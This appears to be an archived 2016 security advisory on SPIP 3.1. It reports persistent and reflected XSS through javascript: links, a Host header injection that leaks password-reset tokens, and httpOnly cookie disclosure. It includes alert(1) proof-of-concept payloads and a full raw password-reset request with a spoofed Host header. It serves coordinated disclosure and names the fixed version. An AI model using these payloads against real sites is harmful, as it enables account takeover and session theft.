@@ -1,0 +1,126 @@
+id: 26373
+date: 11/19/2016
+title: SPIP 3.1 Cross Site Scripting / Header Injection Vulnerabilities
+author: Tim Coen
+cves: 
+
+1. Introduction
+
+Affected         SPIP 3.1
+Product:
+Fixed in:        3.1.2 / 3.0.23
+Fixed Version    http://www.spip.net/en_download
+Link:
+Vendor Website:  http://www.spip.net/
+Vulnerability    Reflected & Persistent XSS, Host Header Injection, httpOnly
+Type:            Cookie disclosure
+Remote           Yes
+Exploitable:
+Reported to      09/05/2016
+vendor:
+Disclosed to     11/10/2016
+public:
+Release mode:    Coordinated Release
+CVE:             n/a
+Credits          Tim Coen of Curesec GmbH
+
+2. Overview
+
+SPIP is a content management system written in PHP. In version 3.1, it is
+vulnerable to a persistent as well as reflected cross site scripting
+vulnerability as it allows users to enter URLs containing the JavaScript
+protocol, which an attacker can exploit to steal cookies, inject JavaScript
+keylogger, or bypass CSRF protection. Additionally, it contains a Host Header
+Injection which may lead to the leakage of password reset tokens and thus the
+compromisation of user accounts. Finally, the application discloses httpOnly
+cookies, making exploitation of XSS issues slightly easier.
+
+3. Details
+
+Persistent XSS
+
+CVSS: Medium 4.3 AV:N/AC:M/Au:N/C:N/I:P/A:N
+
+Description: When posting a message in the internal Forum, user input is
+properly encoded, thus disallowing XSS. However, a hypertext link may be added
+as well, and there is no check on the protocol of the supplied link, which
+leads to an XSS vulnerability.
+
+Proof of Concept:
+
+1. Create a new Message: http://localhost/spip/ecrire/?exec=forum&repondre=new
+2. In the URL field enter: javascript:alert(1) 3. Post the Message To trigger
+the payload, a click on the link is required.
+
+Reflected XSS
+
+CVSS: Low 2.6 AV:N/AC:H/Au:N/C:N/I:P/A:N
+
+Description: When editing a private message, a redirect parameter may be
+submitted as well. This parameter decides to what page a user is returned if
+they were to press the back button. The value of this parameter is user
+controlled and may thus be used for phishing or XSS attacks.
+
+Proof of Concept:
+
+Visit: http://localhost/spip/ecrire/?exec=message_edit&new=oui&to=2&redirect=
+javascript:alert(1) Click on the Back button represented by the envelope icon.
+
+Host Header Injection
+
+CVSS: Low 2.6 AV:N/AC:H/Au:N/C:P/I:N/A:N
+
+Description:
+The application takes the Host Header and uses it in a password reset email. As
+the Host Header is user-controlled, an attacker can set it to arbitrary values.
+
+In the case of a password reset page, this can lead to security issues as an
+attacker can request a password reset email for a user and set the Host header
+to a server they control. As this header is used in the email, a user would be
+send to the attackers server if they were to click on the link, leading to the
+leakage of the recovery token and thus the compromisation of the account.
+
+Proof of Concept:
+
+Request: POST /spip/spip.php?page=spip_pass&lang=en HTTP/1.1 Host: example.com
+Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie:
+spip_accepte_ajax=1; spip_admin=%40admin; PHPSESSID=1l8rvbhcgia45ddj7ldoc1gpf6;
+wb-installer=3d2hes1b6i0bfb586iucm76sp2; wb-4174-sid=u571gr7isplq8b4f01fniqevk2
+Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/
+x-www-form-urlencoded Content-Length: 199 page=spip_pass&lang=en&
+formulaire_action=oubli&formulaire_action_args=
+orESpF0vSC3Q%2BB30uGEFqT7k6AcDObDMasMNzVp3EjndtlvZ%2B5k4g%2FkyF%2BAlzhBhCI%2F%2F9hx%2FZ33mkQPk
+&oubli=visitor%40example.com&nobot= Email Send: [My SPIP site] Forgotten
+password (this is an automated message) To recover your access to the site My
+SPIP site (http://localhost/spip) Please go to the following address: http://
+example.com/spip/spip.php?page=spip_pass&p=107017475657c15ad6e9c781.23674073
+You can then enter a new password and log in to the site.
+
+httpOnly Cookie Disclosure
+
+Description: The phpinfo page discloses httpOnly cookies such as session
+cookies, making it slightly easier to exploit XSS vulnerabilities.
+
+Proof of Concept:
+
+http://localhost/spip/ecrire/?exec=info
+
+4. Solution
+
+To mitigate this issue please upgrade at least to version 3.1.2:
+
+http://www.spip.net/en_download
+
+Please note that a newer version might already be available.
+
+5. Report Timeline
+
+09/05/2016 Informed Vendor about Issue
+09/23/2016 Vendor releases fix
+11/10/2016 Disclosed to public
+
+
+Blog Reference:
+https://www.curesec.com/blog/article/blog/SPIP-31-XSS-amp-Host-Header-Injection-178.html
+
+#  0day.today [2023-03-23]  #
